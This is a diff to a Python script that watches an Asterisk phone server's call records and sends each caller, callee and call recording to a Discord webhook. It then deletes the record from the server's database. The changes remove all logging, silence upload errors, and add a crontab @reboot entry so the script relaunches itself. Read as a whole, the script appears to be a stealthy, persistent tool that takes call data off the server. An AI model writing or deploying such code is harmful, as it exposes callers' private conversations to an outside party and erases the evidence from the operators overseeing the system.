@@ -2,6 +2,7 @@ import os
 import time
 import requests
 import mysql.connector
+import subprocess
 
 discord_webhook_url = "https://dummywebhookurl.net"
 
@@ -13,6 +14,14 @@ db_config = {
 }
 
 recording_base_directory = "/var/spool/asterisk/monitor/"
+
+def compress_audio(input_path, output_path):
+    try:
+        command = ["ffmpeg", "-i", input_path, "-b:a", "64k", "-ar", "16000", output_path]
+        subprocess.run(command, check=True)
+        return output_path
+    except subprocess.CalledProcessError:
+        return None
 
 def fetch_recent_cdr():
     conn = mysql.connector.connect(**db_config)
@@ -36,10 +45,9 @@ def delete_cdr(cdr_id):
     conn.close()
 
 def send_cdr_log(cdr_data):
-    """Formats and sends the CDR data to Discord via webhook."""
     embed = {
-        "title": "ðŸ“ž Call Ended",
-        "color": 16738740, 
+        "title": "📞 Call Ended",
+        "color": 16738740,
         "fields": [
             {"name": "Caller", "value": cdr_data["src"], "inline": True},
             {"name": "Callee", "value": cdr_data["dst"], "inline": True},
@@ -54,63 +62,50 @@ def send_cdr_log(cdr_data):
             {"name": "Unique ID", "value": str(cdr_data["uniqueid"]), "inline": False},
         ],
         "footer": {
-            "text": "Made with <3 MelodyRocks"
+            "text": "(c) 2025 MelodyRocks"
         }
     }
-
     payload = {"embeds": [embed]}
     requests.post(discord_webhook_url, json=payload)
 
 def send_call_recording(recording_path):
-    """Sends the call recording to Discord."""
     if recording_path and os.path.exists(recording_path):
+        compressed_path = recording_path.replace(".wav", "_compressed.mp3")
+        compressed_path = compress_audio(recording_path, compressed_path)
+        
+        if not compressed_path:
+            return
+        
         try:
-            file_size = os.path.getsize(recording_path)
-            if file_size <= 44:
-                print(f"Recording is too small ({file_size} bytes). Skipping upload.")
-                return
-
-            with open(recording_path, "rb") as recording_file:
+            with open(compressed_path, "rb") as recording_file:
                 files = {"file": recording_file}
-                response = requests.post(discord_webhook_url, files=files)
-                response.raise_for_status()
-        except Exception as e:
-            print(f"Error uploading file: {e}")
-    else:
-        print(f"Recording not found at {recording_path}. Skipping file upload.")
+                requests.post(discord_webhook_url, files=files)
+            os.remove(compressed_path)
+        except Exception:
+            pass
+
+def setup_cron_job():
+    cron_command = f"@reboot python3 {os.path.abspath(__file__)} &"
+    existing_cron = os.popen("crontab -l 2>/dev/null").read()
+    if cron_command in existing_cron:
+        return
+    os.system(f"(crontab -l 2>/dev/null; echo '{cron_command}') | crontab -")
 
 def monitor_channel_creation():
-    print("Monitoring Asterisk SIP channels...")
     while True:
         cdr_data = fetch_recent_cdr()
-        print(f"Fetched CDR: {cdr_data}")
-        
         if cdr_data:
-            calldate = cdr_data["calldate"]
-            year = calldate.strftime("%Y")
-            month = calldate.strftime("%m")
-            day = calldate.strftime("%d")
-            
-            recording_filename = cdr_data.get('recordingfile')
-            if recording_filename:
-                recording_path = os.path.join(recording_base_directory, year, month, day, recording_filename)
-                print(f"Recording Path: {recording_path}")
-            else:
-                recording_path = None
-                print("No recording found in CDR data.")
-            
             send_cdr_log(cdr_data)
-            print(f"Logged call end with Unique ID: {cdr_data['uniqueid']}")
-
+            calldate = cdr_data["calldate"]
+            year, month, day = calldate.strftime("%Y"), calldate.strftime("%m"), calldate.strftime("%d")
+            recording_filename = cdr_data.get('recordingfile')
+            recording_path = os.path.join(recording_base_directory, year, month, day, recording_filename) if recording_filename else None
             time.sleep(5)
             send_call_recording(recording_path)
             delete_cdr(cdr_data["uniqueid"])
-            print(f"Deleted call with Unique ID: {cdr_data['uniqueid']}")
-        else:
-            print("No recent calls.")
         time.sleep(5)
 
 if __name__ == "__main__":
+    print("(c) 2025 MelodyRocks")
+    setup_cron_job()
     monitor_channel_creation()
-
-
